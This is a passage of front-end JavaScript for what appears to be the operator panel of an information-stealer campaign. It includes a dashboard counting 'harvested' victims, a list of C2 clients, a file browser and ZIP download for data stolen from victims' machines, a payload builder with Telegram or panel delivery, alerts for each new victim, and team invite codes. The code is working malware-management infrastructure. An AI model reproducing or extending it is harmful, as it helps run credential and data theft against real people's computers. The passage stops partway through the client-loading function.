// State Management
let currentPage = 1;
const logsLimit = 15;
let searchQuery = '';
let searchTimeout;
let blurSaveTimeout;
let currentUser = null;

function getFlagHtml(countryCode) {
    if (!countryCode || countryCode === 'Unknown') return '';
    return `<img src="https://flagcdn.com/16x12/${countryCode.toLowerCase()}.png" 
                 class="country-flag" 
                 alt="${countryCode}" 
                 title="${countryCode}"
                 style="vertical-align: middle; margin-right: 8px; border-radius: 2px; box-shadow: 0 1px 3px rgba(0,0,0,0.15);">`;
}

function formatRAM(ramMB) {
    if (!ramMB || ramMB <= 0) return 'Unknown';
    if (ramMB >= 1024) {
        const gb = ramMB / 1024;
        return `${Math.round(gb)} GB`;
    }
    return `${ramMB} MB`;
}

let currentViewLogId = null;
const binaryExts = ['.exe', '.dll', '.bin', '.dat', '.zip', '.rar', '.7z', '.gz', '.tar', '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.ico', '.mp3', '.mp4', '.avi', '.mov', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.pdb', '.obj', '.lib', '.so', '.dylib', '.node', '.wasm'];

function isBinary(filename) {
    const ext = '.' + filename.split('.').pop().toLowerCase();
    return binaryExts.includes(ext);
}

function buildFileTree(files) {
    const root = {};

    files.forEach(f => {
        if (f.name === 'screenshot.jpg' || f.name === 'Information.txt') return;
        const parts = f.name.replace(/\\/g, '/').split('/').filter(Boolean);
        let node = root;
        parts.forEach((part, i) => {
            if (!node[part]) {
                node[part] = i === parts.length - 1
                    ? { __file: true, __size: f.size, __path: f.name }
                    : {};
            }
            node = node[part];
        });
    });

    return root;
}

function renderFileTree(tree, depth) {
    if (depth === undefined) depth = 0;
    let html = '';

    const folders = [];
    const filesArr = [];

    Object.keys(tree).forEach(key => {
        if (key.startsWith('__')) return;
        if (tree[key].__file) {
            filesArr.push({ name: key, size: tree[key].__size, path: tree[key].__path });
        } else {
            folders.push(key);
        }
    });

    folders.forEach(folder => {
        const childCount = countTreeItems(tree[folder]);
        html += `<li class="file-tree-folder" style="padding-left: ${12 + depth * 16}px;">
            <span class="folder-toggle" onclick="this.parentElement.classList.toggle('collapsed')">
                <svg class="folder-arrow" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>
                <svg class="folder-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                <span class="folder-name">${escapeHtml(folder)}</span>
                <span class="folder-count">${childCount}</span>
            </span>
            <ul class="file-tree-children">${renderFileTree(tree[folder], depth + 1)}</ul>
        </li>`;
    });

    filesArr.forEach(f => {
        const safePath = f.path.replace(/\\/g, '/').replace(/'/g, "\\'");
        html += `<li class="file-tree-file viewable" style="padding-left: ${12 + depth * 16}px;" onclick="openFileViewer(${currentViewLogId}, '${safePath}', this)">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
            <span class="file-name">${escapeHtml(f.name)}</span>
            <span class="file-size">${formatBytes(f.size)}</span>
        </li>`;
    });

    return html;
}

function countTreeItems(tree) {
    let count = 0;
    Object.keys(tree).forEach(key => {
        if (key.startsWith('__')) return;
        if (tree[key].__file) {
            count++;
        } else {
            count += countTreeItems(tree[key]);
        }
    });
    return count;
}

async function openFileViewer(logId, filePath, el) {
    document.querySelectorAll('.file-tree-file.active-file').forEach(f => f.classList.remove('active-file'));
    if (el) el.classList.add('active-file');

    const screenshotSection = document.getElementById('screenshot-section');
    const viewerSection = document.getElementById('file-viewer-section');
    const viewerTitle = document.getElementById('file-viewer-title');
    const viewerContent = document.getElementById('file-viewer-content');

    screenshotSection.style.display = 'none';
    viewerSection.style.display = 'flex';

    const filename = filePath.split('/').pop().split('\\').pop();
    viewerTitle.innerText = filename;
    viewerContent.innerHTML = '<div class="file-viewer-binary"><span>Loading...</span></div>';

    try {
        const url = `/api/logs/${logId}?file=${encodeURIComponent(filePath)}`;
        console.log('[FileViewer] Fetching:', url);
        const res = await fetch(url);
        const text = await res.text();
        console.log('[FileViewer] Status:', res.status, 'Length:', text.length, 'Start:', text.substring(0, 200));
        let data;
        try {
            data = JSON.parse(text);
        } catch (parseErr) {
            throw new Error('Server error: ' + text.substring(0, 300));
        }
        if (!res.ok) throw new Error(data.error || 'Failed to load file');
        if (data.error) throw new Error(data.error);

        if (data.type === 'text') {
            const lines = data.content.split('\n');
            const lineCount = lines.length;
            const charCount = data.content.length;
            let linesHtml = lines.map((line, i) =>
                `<div class="line"><span class="line-num">${i + 1}</span><span class="line-content">${escapeHtml(line)}</span></div>`
            ).join('');

            viewerContent.innerHTML = `
                <div class="file-viewer-text">${linesHtml}</div>
                <div class="file-viewer-bar">
                    <div class="viewer-info">
                        <span>${lineCount} lines</span>
                        <span>${formatBytes(charCount)}</span>
                    </div>
                    <span>${filename}</span>
                </div>
            `;
        } else {
            viewerContent.innerHTML = `
                <div class="file-viewer-binary">
                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
                    <span>Binary file${data.size ? ' — ' + formatBytes(data.size) : ''}</span>
                    <span style="font-size: 11px; color: var(--text-muted);">Preview not available</span>
                </div>
            `;
        }
    } catch (err) {
        viewerContent.innerHTML = `<div class="file-viewer-binary"><span style="color: var(--accent-red);">Error: ${escapeHtml(err.message)}</span></div>`;
    }
}

function closeFileViewer() {
    document.getElementById('file-viewer-section').style.display = 'none';
    document.getElementById('screenshot-section').style.display = 'flex';
    document.querySelectorAll('.file-tree-file.active-file').forEach(f => f.classList.remove('active-file'));
}

// Routing - Tab Switching
document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');

        const tabName = btn.getAttribute('data-tab');
        document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
        document.getElementById(`${tabName}-tab`).classList.add('active');

        if (tabName === 'dashboard') {
            loadDashboardStats();
        } else if (tabName === 'clients') {
            loadClients();
        } else if (tabName === 'settings') {
            loadSettings();
            loadProfileUI();
        } else if (tabName === 'hub') {
            loadHub();
        }
    });
});

// Builder Delivery Form Toggle
const buildDeliveryRadios = document.querySelectorAll('input[name="build-delivery"]');
buildDeliveryRadios.forEach(radio => {
    radio.addEventListener('change', (e) => {
        const value = e.target.value;
        if (value === 'TELEGRAM') {
            document.getElementById('build-tg-fields').style.display = 'block';
            document.getElementById('build-panel-fields').style.display = 'none';
        } else if (value === 'PANEL') {
            document.getElementById('build-tg-fields').style.display = 'none';
            document.getElementById('build-panel-fields').style.display = 'block';
        }
    });
});

// Theme Selectors
document.querySelectorAll('.theme-selector').forEach(sel => {
    sel.addEventListener('click', async () => {
        document.querySelectorAll('.theme-selector').forEach(s => s.classList.remove('active'));
        sel.classList.add('active');

        const theme = sel.getAttribute('data-theme');
        document.body.className = theme;

        // If switching to built-in theme, hide custom background controls
        if (theme !== 'theme-custom') {
            document.getElementById('blur-control-group').style.display = 'none';
        }

        // Save theme persistent
        try {
            await fetch('/api/settings', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ active_bg_theme: theme })
            });
        } catch (err) {
            console.error('Error saving theme:', err);
        }
    });
});

let autoRefreshInterval = null;
let lastTotalLogs = null;

function startAutoRefresh() {
    if (autoRefreshInterval) clearInterval(autoRefreshInterval);
    
    autoRefreshInterval = setInterval(async () => {
        const activeTab = document.querySelector('.nav-btn.active')?.getAttribute('data-tab');
        if (activeTab === 'dashboard') {
            await loadDashboardStats();
        } else if (activeTab === 'clients') {
            await loadClients();
        } else {
            try {
                const res = await fetch('/api/stats');
                    const stats = await res.json();
                    checkNewLogs(stats.totalLogs);
                } catch (e) {
                    console.error('Error polling stats:', e);
                }
            }
        }, 8000);
}

async function checkNewLogs(currentTotal) {
    if (lastTotalLogs !== null && currentTotal > lastTotalLogs) {
        let logInfo = 'New target data received';
        try {
            const latestRes = await fetch('/api/logs?limit=1');
            const latestData = await latestRes.json();
            if (latestData.logs && latestData.logs.length > 0) {
                const log = latestData.logs[0];
                logInfo = `${log.username}@${log.hostname} — ${log.ip}`;
            }
        } catch (e) {}

        showToast('New log collected', logInfo);
        playNotificationSound();
        sendBrowserNotification('New log collected', logInfo);

        const activeTab = document.querySelector('.nav-btn.active')?.getAttribute('data-tab');
        if (activeTab === 'clients') {
            loadClients();
        }
    }
    lastTotalLogs = currentTotal;
}

function playNotificationSound() {
    const soundEnabled = localStorage.getItem('sound_alerts_enabled') !== 'false';
    if (!soundEnabled) return;
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.frequency.value = 880;
        osc.type = 'sine';
        gain.gain.setValueAtTime(0.3, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
        osc.start(ctx.currentTime);
        osc.stop(ctx.currentTime + 0.5);
    } catch (e) {
        const audio = new Audio('/notify.mp3');
        audio.play().catch(() => {});
    }
}

function sendBrowserNotification(title, body) {
    if (!('Notification' in window)) return;
    if (Notification.permission === 'granted') {
        new Notification(title, { body, icon: '/favicon.ico' });
    } else if (Notification.permission !== 'denied') {
        Notification.requestPermission().then(p => {
            if (p === 'granted') new Notification(title, { body, icon: '/favicon.ico' });
        });
    }
}

async function loadClientsSilent() {
    try {
        const url = `/api/logs?page=${currentPage}&limit=${logsLimit}&search=${encodeURIComponent(searchQuery)}`;
        const response = await fetch(url);
        const data = await response.json();
        
        // Also check stats count
        const statsRes = await fetch('/api/stats');
        const stats = await statsRes.json();
        checkNewLogs(stats.totalLogs);

        const container = document.getElementById('clients-list-container');
        if (!data.logs || data.logs.length === 0) {
            container.innerHTML = `<div class="empty-state py-8">No harvested clients found.</div>`;
            return;
        }

        container.innerHTML = '';
        data.logs.forEach(log => {
            container.appendChild(renderClientRow(log));
        });

        document.getElementById('current-page').innerText = data.page;
        document.getElementById('total-pages').innerText = data.totalPages;
        document.getElementById('prev-page-btn').disabled = data.page <= 1;
        document.getElementById('next-page-btn').disabled = data.page >= data.totalPages;
    } catch (err) {
        console.error('Error loading clients silently:', err);
    }
}

// Initialize on Load — auth check first
window.addEventListener('DOMContentLoaded', async () => {
    try {
        const res = await fetch('/api/auth/check');
        const data = await res.json();
        if (!data.authenticated) {
            window.location.href = '/login';
            return;
        }
        currentUser = data.user;
        initAuthUI();
    } catch (e) {
        window.location.href = '/login';
        return;
    }

    await loadSettings();
    await loadDashboardStats();
    startAutoRefresh();

    if ('Notification' in window && Notification.permission === 'default') {
        Notification.requestPermission();
    }
});

function updateSidebarUser(user) {
    const displayName = user.display_name || user.username;
    const roleLabel = user.role === 'admin' ? 'Administrator' : 'User';
    const avatarHtml = user.avatar
        ? `<img src="${user.avatar}" style="width:100%;height:100%;object-fit:cover;border-radius:50%;" alt="">`
        : `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>`;

    document.getElementById('sidebar-username').textContent = displayName;
    document.getElementById('sidebar-role').textContent = roleLabel;

    const avatarEl = document.getElementById('sidebar-user-avatar');
    if (avatarEl) avatarEl.innerHTML = avatarHtml;

    // Popup
    const popupName = document.getElementById('popup-display-name');
    const popupRole = document.getElementById('popup-role');
    const popupAvatar = document.getElementById('popup-avatar');
    if (popupName) popupName.textContent = displayName;
    if (popupRole) popupRole.textContent = roleLabel;
    if (popupAvatar) {
        if (user.avatar) {
            popupAvatar.innerHTML = `<img src="${user.avatar}" alt="">`;
        } else {
            popupAvatar.innerHTML = `<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--text-muted)" stroke-width="1.5"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>`;
        }
    }
}

function initAuthUI() {
    updateSidebarUser(currentUser);
    document.getElementById('sidebar-role').textContent = currentUser.role === 'admin' ? 'Administrator' : 'User';

    if (currentUser.role === 'admin') {
        document.getElementById('nav-admin-section').style.display = 'block';
    }

    // Profile popup
    const userInfo = document.getElementById('sidebar-user-info');
    const popup = document.getElementById('profile-popup');
    const chevron = document.getElementById('user-info-chevron');

    userInfo.addEventListener('click', (e) => {
        e.stopPropagation();
        const isOpen = popup.classList.toggle('open');
        if (chevron) chevron.style.transform = isOpen ? 'rotate(180deg)' : '';
    });

    document.addEventListener('click', () => {
        popup.classList.remove('open');
        if (chevron) chevron.style.transform = '';
    });

    popup.addEventListener('click', e => e.stopPropagation());

    document.getElementById('popup-logout-btn').addEventListener('click', async () => {
        try { await fetch('/api/auth/logout', { method: 'POST' }); } catch (e) {}
        window.location.href = '/login';
    });

    document.getElementById('popup-edit-btn').addEventListener('click', () => {
        popup.classList.remove('open');
        if (chevron) chevron.style.transform = '';
        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
        document.getElementById('settings-tab').classList.add('active');
        loadSettings();
        loadProfileUI();
        setTimeout(() => document.getElementById('profile-card')?.scrollIntoView({ behavior: 'smooth', block: 'start' }), 100);
    });

    // Admin tab nav
    const adminNavBtn = document.querySelector('[data-tab="admin"]');
    if (adminNavBtn) {
        adminNavBtn.addEventListener('click', () => {
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
            adminNavBtn.classList.add('active');
            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
            document.getElementById('admin-tab').classList.add('active');
            loadAdminUsers();
            loadAuditLogs();
        });
    }
}

// ===== ADMIN PANEL =====

async function loadAdminUsers() {
    const container = document.getElementById('admin-users-list');
    if (!container) return;
    try {
        const res = await fetch('/api/admin/users');
        if (!res.ok) {
            container.innerHTML = '<tr><td colspan="7" class="empty-state py-4 text-center">Access denied</td></tr>';
            return;
        }
        const data = await res.json();
        if (!data.users || data.users.length === 0) {
            container.innerHTML = '<tr><td colspan="7" class="empty-state py-4 text-center">No users registered yet.</td></tr>';
            return;
        }

        container.innerHTML = data.users.map(u => {
            const isSelf = currentUser && u.id === currentUser.id;
            const statusBadge = u.is_banned 
                ? `<span class="badge badge-danger" title="${escapeHtml(u.ban_reason || 'No reason')}">Banned (${escapeHtml(u.ban_reason || 'No reason')})</span>` 
                : `<span class="badge badge-success">Active</span>`;
            const roleBadge = u.role === 'admin' 
                ? `<span class="badge badge-primary">Admin</span>` 
                : `<span class="badge badge-secondary">User</span>`;

            let actions = '';
            if (!isSelf && u.role !== 'admin') {
                if (u.is_banned) {
                    actions += `<button class="btn btn-sm btn-outline" style="padding: 4px 10px; font-size:12px; margin-right:4px;" onclick="adminBanToggle(${u.id}, 0, '${escapeHtml(u.username)}')">Unfreeze</button>`;
                } else {
                    actions += `<button class="btn btn-sm btn-danger" style="padding: 4px 10px; font-size:12px; margin-right:4px;" onclick="adminBanPrompt(${u.id}, '${escapeHtml(u.username)}')">Freeze / Ban</button>`;
                }
                actions += `<button class="btn btn-sm btn-secondary" style="padding: 4px 10px; font-size:12px;" onclick="adminViewUserLogs(${u.id}, '${escapeHtml(u.username)}')">View Logs (${u.log_count})</button>`;
            } else if (isSelf) {
                actions = '<span class="text-muted" style="font-size:12px;">You</span>';
            } else {
                actions = '<span class="text-muted" style="font-size:12px;">Super Admin</span>';
            }

            return `
                <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
                    <td style="padding:10px;">#${u.id}</td>
                    <td style="padding:10px;"><strong>${escapeHtml(u.username)}</strong></td>
                    <td style="padding:10px;">${roleBadge}</td>
                    <td style="padding:10px;">${u.log_count} logs</td>
                    <td style="padding:10px;">${statusBadge}</td>
                    <td style="padding:10px; font-size:12px; color:rgba(255,255,255,0.6);">${formatDate(u.created_at)}</td>
                    <td style="padding:10px; text-align:right;">${actions}</td>
                </tr>
            `;
        }).join('');
    } catch (err) {
        container.innerHTML = `<tr><td colspan="7" class="empty-state py-4 text-center text-danger">Error: ${escapeHtml(err.message)}</td></tr>`;
    }
}

function adminBanPrompt(userId, username) {
    const reason = prompt(`Enter ban/freeze reason for user "${username}":`, 'Violation of terms');
    if (reason === null) return;
    adminBanToggle(userId, 1, username, reason);
}

async function adminBanToggle(userId, isBanned, username, banReason = '') {
    try {
        const res = await fetch(`/api/admin/users/${userId}/ban`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ is_banned: isBanned, ban_reason: banReason })
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error);
        showToast(isBanned ? 'User Frozen' : 'User Unfrozen', `User ${username} ${isBanned ? 'has been banned' : 'is active again'}`);
        loadAdminUsers();
        loadAuditLogs();
    } catch (err) {
        showAlert('Ban Operation Failed', err.message);
    }
}

async function adminViewUserLogs(userId, username) {
    try {
        const res = await fetch(`/api/admin/users/${userId}/logs`);
        const data = await res.json();
        if (!res.ok) throw new Error(data.error);

        if (!data.logs || data.logs.length === 0) {
            showAlert(`User Logs: ${username}`, `User ${username} has zero logs harvested.`);
            return;
        }

        let logsHtml = `<ul style="max-height:300px; overflow-y:auto; padding-left:15px; margin-top:10px;">`;
        data.logs.forEach(l => {
            logsHtml += `<li style="margin-bottom:6px; font-size:13px;">
                <strong>${escapeHtml(l.username)}@${escapeHtml(l.hostname)}</strong> (${escapeHtml(l.ip)}) - ${l.date_time || l.created_at} 
                <a href="/api/logs/${l.id}/download" style="color:#7289da; margin-left:8px;" download>[Download ZIP]</a>
            </li>`;
        });
        logsHtml += `</ul>`;

        showDialog({
            title: `Harvested Logs (${username})`,
            message: `Inspecting ${data.logs.length} logs owned by ${username}:${logsHtml}`,
            type: 'info',
            confirmText: 'Close',
            onConfirm: () => {}
        });
    } catch (err) {
        showAlert('Error', err.message);
    }
}

async function loadAuditLogs() {
    const container = document.getElementById('admin-audit-list');
    if (!container) return;
    try {
        const res = await fetch('/api/admin/audit_logs');
        if (!res.ok) return;
        const data = await res.json();
        if (!data.audit_logs || data.audit_logs.length === 0) {
            container.innerHTML = '<tr><td colspan="5" class="empty-state py-4 text-center">No audit records found.</td></tr>';
            return;
        }

        container.innerHTML = data.audit_logs.map(log => {
            return `
                <tr style="border-bottom:1px solid rgba(255,255,255,0.05); font-size:13px;">
                    <td style="padding:8px; color:rgba(255,255,255,0.6);">${formatDate(log.created_at)}</td>
                    <td style="padding:8px;"><strong>${escapeHtml(log.admin_username || 'System')}</strong></td>
                    <td style="padding:8px;"><span class="badge badge-primary">${escapeHtml(log.action)}</span></td>
                    <td style="padding:8px;">${escapeHtml(log.details)}</td>
                    <td style="padding:8px; font-family:monospace; color:rgba(255,255,255,0.7);">${escapeHtml(log.ip || '-')}</td>
                </tr>
            `;
        }).join('');
    } catch (err) {
        container.innerHTML = `<tr><td colspan="5" class="empty-state py-4 text-center text-danger">Failed to load audit logs.</td></tr>`;
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const genInviteBtn = document.getElementById('admin-gen-invite-btn');
    if (genInviteBtn) {
        genInviteBtn.addEventListener('click', async () => {
            try {
                const res = await fetch('/api/admin/invites/generate', { method: 'POST' });
                const data = await res.json();
                if (data.code) {
                    showDialog({
                        title: 'Invite Code Created',
                        message: `Send this registration code to your team member:<br><br><strong style="font-size:18px; letter-spacing:1px; color:#43b581;">${data.code}</strong>`,
                        type: 'info',
                        confirmText: 'Copy Code',
                        onConfirm: () => {
                            navigator.clipboard.writeText(data.code);
                            showToast('Copied', 'Invite code copied to clipboard');
                        }
                    });
                    loadAuditLogs();
                }
            } catch (err) {
                showAlert('Error', err.message);
            }
        });
    }
});

// --- Custom Background Image Upload ---
document.getElementById('custom-bg-input').addEventListener('change', async (e) => {
    const file = e.target.files[0];
    if (!file) return;

    const formData = new FormData();
    formData.append('background', file);

    try {
        const res = await fetch('/api/settings/background', {
            method: 'POST',
            body: formData
        });

        const data = await res.json();
        if (!res.ok) throw new Error(data.error || 'Upload failed');

        // Apply custom theme immediately
        applyCustomBackground(data.custom_bg_path);
        
        // Update theme selectors active state
        document.querySelectorAll('.theme-selector').forEach(s => s.classList.remove('active'));

        // Load blur value
        const blurSlider = document.getElementById('bg-blur-slider');
        applyBlurValue(blurSlider.value);

    } catch (err) {
        showAlert('Upload Failed', err.message);
    }
});

// Remove Custom Background
document.getElementById('delete-custom-bg-btn').addEventListener('click', () => {
    showDialog({
        title: 'Remove Background',
        message: 'Your custom background image will be removed and the default theme restored.',
        type: 'warning',
        confirmText: 'Remove',
        onConfirm: async () => {
            try {
                const res = await fetch('/api/settings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        custom_bg_path: '',
                        active_bg_theme: 'theme-default'
                    })
                });

                if (!res.ok) throw new Error('Failed to update settings');

                document.body.className = 'theme-default';
                clearCustomBackground();
                document.getElementById('delete-custom-bg-btn').style.display = 'none';
                document.getElementById('blur-control-group').style.display = 'none';

                document.querySelectorAll('.theme-selector').forEach(s => {
                    if (s.getAttribute('data-theme') === 'theme-default') {
                        s.classList.add('active');
                    } else {
                        s.classList.remove('active');
                    }
                });
            } catch (err) {
                showAlert('Error', err.message);
            }
        }
    });
});

// Blur Slider Input Handler
const bgBlurSlider = document.getElementById('bg-blur-slider');
bgBlurSlider.addEventListener('input', (e) => {
    const val = e.target.value;
    applyBlurValue(val);

    // Debounce database save to prevent lag
    clearTimeout(blurSaveTimeout);
    blurSaveTimeout = setTimeout(async () => {
        try {
            await fetch('/api/settings', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ bg_blur_value: val })
            });
        } catch (err) {
            console.error('Error saving blur value:', err);
        }
    }, 500);
});

function isVideoBg(url) {
    return url && /\.(mp4|webm)(\?|$)/i.test(url);
}

function applyCustomBackground(url) {
    if (!url) return;
    const videoEl = document.getElementById('custom-bg-video');
    if (isVideoBg(url)) {
        document.body.className = 'theme-custom-video';
        document.documentElement.style.removeProperty('--custom-bg-image');
        if (videoEl) {
            videoEl.src = url;
            videoEl.load();
            videoEl.play().catch(() => {});
        }
    } else {
        document.body.className = 'theme-custom';
        document.documentElement.style.setProperty('--custom-bg-image', `url('${url}')`);
        if (videoEl) { videoEl.src = ''; videoEl.load(); }
    }
    const delBtn = document.getElementById('delete-custom-bg-btn');
    if (delBtn) delBtn.style.display = 'inline-flex';
    const blurGroup = document.getElementById('blur-control-group');
    if (blurGroup) blurGroup.style.display = 'block';
}

function clearCustomBackground() {
    const videoEl = document.getElementById('custom-bg-video');
    if (videoEl) { videoEl.src = ''; videoEl.load(); }
    document.documentElement.style.removeProperty('--custom-bg-image');
}

function applyBlurValue(px) {
    document.getElementById('blur-val-display').innerText = `${px}px`;
    document.documentElement.style.setProperty('--bg-blur-val', `${px}px`);
}

// --- API Fetch Functions ---

// 1. Dashboard Statistics
async function loadDashboardStats() {
    try {
        const response = await fetch('/api/stats');
        const stats = await response.json();

        document.getElementById('stat-total-logs').innerText = stats.totalLogs || 0;
        document.getElementById('stat-logs-today').innerText = stats.logsToday || 0;
        document.getElementById('stat-unique-ips').innerText = stats.uniqueIps || 0;

        // Render OS count list
        const osList = document.getElementById('os-list');
        if (stats.osStats && stats.osStats.length > 0) {
            osList.innerHTML = '';
            const maxCount = Math.max(...stats.osStats.map(o => o.count));
            
            stats.osStats.forEach(item => {
                const percentage = maxCount > 0 ? (item.count / maxCount) * 100 : 0;
                const div = document.createElement('div');
                div.className = 'os-item';
                div.innerHTML = `
                    <span class="os-name">${escapeHtml(item.os)}</span>
                    <div class="os-progress-container">
                        <div class="os-progress-bar" style="width: ${percentage}%"></div>
                    </div>
                    <span class="os-count">${item.count}</span>
                `;
                osList.appendChild(div);
            });
        } else {
            osList.innerHTML = `<p class="empty-state">No OS data available yet.</p>`;
        }

        // Recent logs activity list
        const recentRes = await fetch('/api/logs?limit=5');
        const recentData = await recentRes.json();
        const recentList = document.getElementById('recent-list');
        
        if (recentData.logs && recentData.logs.length > 0) {
            recentList.innerHTML = '';
            recentData.logs.forEach(log => {
                const div = document.createElement('div');
                div.className = 'activity-item';
                div.innerHTML = `
                    <div class="activity-avatar"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
                    <div class="activity-details">
                        <div class="activity-title"><strong>${escapeHtml(log.username)}</strong>@${escapeHtml(log.hostname)}</div>
                        <div class="activity-meta">${formatDate(log.created_at)}</div>
                    </div>
                    <div class="activity-ip">${getFlagHtml(log.country_code)}${log.ip}</div>
                `;
                recentList.appendChild(div);
            });
        } else {
            recentList.innerHTML = `<p class="empty-state">No recent activity.</p>`;
        }
        checkNewLogs(stats.totalLogs);
    } catch (err) {
        console.error('Error loading dashboard stats:', err);
    }
}

// 2. Clients Horizontal list
function renderC2OnlyRow(client, isOnline) {
    const row = document.createElement('div');
    row.className = 'client-row';
    row.dataset.c2Id = client.client_id;
    row.style.cursor = 'pointer';
    const statusClass = isOnline ? 'status-online' : 'status-offline';
    const statusText = isOnline ? 'Online' : 'Offline';
    const parts = client.client_id.split('_');
    const hostname = parts[0] || client.hostname || '';
    const username = parts.slice(1).join('_') || client.username || '';
    const hbDate = client.last_heartbeat ? formatDate(client.last_heartbeat) : '';

    row.innerHTML = `
        <div class="client-checkbox">
            <input type="checkbox" data-client-id="${escapeHtml(client.client_id)}" onchange="updateBulkActions()">
        </div>
        <div class="client-status-pill ${statusClass}">
            <span class="status-dot"></span>
            <span class="status-text">${statusText}</span>
        </div>
        <div class="client-info-user">
            <strong>${escapeHtml(username)}</strong>
            <span>@${escapeHtml(hostname)}</span>
        </div>
        <div class="client-info-ip">${client.ip || ''}</div>
        <div class="client-info-os"><span>Awaiting steal</span></div>
        <div class="client-info-files"><span>—</span></div>
        <div class="client-info-date">${hbDate}</div>
    `;
    const checkbox = row.querySelector('input[type="checkbox"]');
    checkbox.addEventListener('change', (e) => {
        e.stopPropagation();
        row.classList.toggle('selected', checkbox.checked);
    });
    row.addEventListener('dblclick', (e) => {
        if (e.target.type === 'checkbox') return;
        window.open('/client.html?id=' + encodeURIComponent(client.client_id), '_blank');
    });
    return row;
}

function renderClientRow(log, isOnline) {
    const row = document.createElement('div');
    row.className = 'client-row';
    row.dataset.id = log.id;
    row.dataset.logId = log.id;
    row.style.cursor = 'pointer';

    const dateStr = formatDate(log.created_at);
    const statusClass = isOnline ? 'status-online' : 'status-offline';
    const statusText = isOnline ? 'Online' : 'Offline';
    const clientId = log.hostname + '_' + log.username;

    row.innerHTML = `
        <div class="client-checkbox">
            <input type="checkbox" data-log-id="${log.id}" data-client-id="${escapeHtml(clientId)}" onchange="updateBulkActions()">
        </div>
        <div class="client-status-pill ${statusClass}">
            <span class="status-dot"></span>
            <span class="status-text">${statusText}</span>
        </div>
        <div class="client-info-user">
            <strong>${escapeHtml(log.username)}</strong>
            <span>@${escapeHtml(log.hostname)}</span>
        </div>
        <div class="client-info-ip">${getFlagHtml(log.country_code)}${log.ip}</div>
        <div class="client-info-os"><span>${escapeHtml(log.os)}</span></div>
        <div class="client-info-files"><span>${log.file_count} files</span></div>
        <div class="client-info-date">${dateStr}</div>
    `;

    const checkbox = row.querySelector('input[type="checkbox"]');
    checkbox.addEventListener('change', (e) => {
        e.stopPropagation();
        row.classList.toggle('selected', checkbox.checked);
    });

    row.addEventListener('dblclick', (e) => {
        if (e.target.type === 'checkbox') return;
        window.open('/client.html?id=' + encodeURIComponent(clientId), '_blank');
    });

    return row;
}

function deleteClient(clientId, btnEl) {
    showDialog({
        title: 'Remove Client',
        message: 'Remove this client from the panel?',
        type: 'danger',
        confirmText: 'Remove',
        onConfirm: async () => {
            try {
                const res = await fetch('/api/c2/clients/' + encodeURIComponent(clientId), { method: 'DELETE' });
                if (res.ok) {
                    const row = btnEl.closest('.client-row');
                    if (row) row.remove();
                }
            } catch {}
        }
    });
}

function getSelectedLogIds() {
    return Array.from(document.querySelectorAll('.client-checkbox input[type="checkbox"]:checked'))
        .filter(cb => cb.dataset.logId)
        .map(cb => parseInt(cb.dataset.logId));
}

function getSelectedClientIds() {
    return Array.from(document.querySelectorAll('.client-checkbox input[type="checkbox"]:checked'))
        .filter(cb => cb.dataset.clientId)
        .map(cb => cb.dataset.clientId);
}

function updateBulkActions() {
    const totalSelected = document.querySelectorAll('.client-checkbox input[type="checkbox"]:checked').length;
    const bar = document.getElementById('bulk-actions');
    const countEl = document.getElementById('bulk-count-num');

    if (totalSelected > 0) {
        bar.classList.add('visible');
        countEl.innerText = totalSelected;
    } else {
        bar.classList.remove('visible');
    }
}

async function loadClients() {
    const container = document.getElementById('clients-list-container');
    const isFirstLoad = !container.querySelector('[data-log-id], [data-c2-id]');

    if (isFirstLoad) {
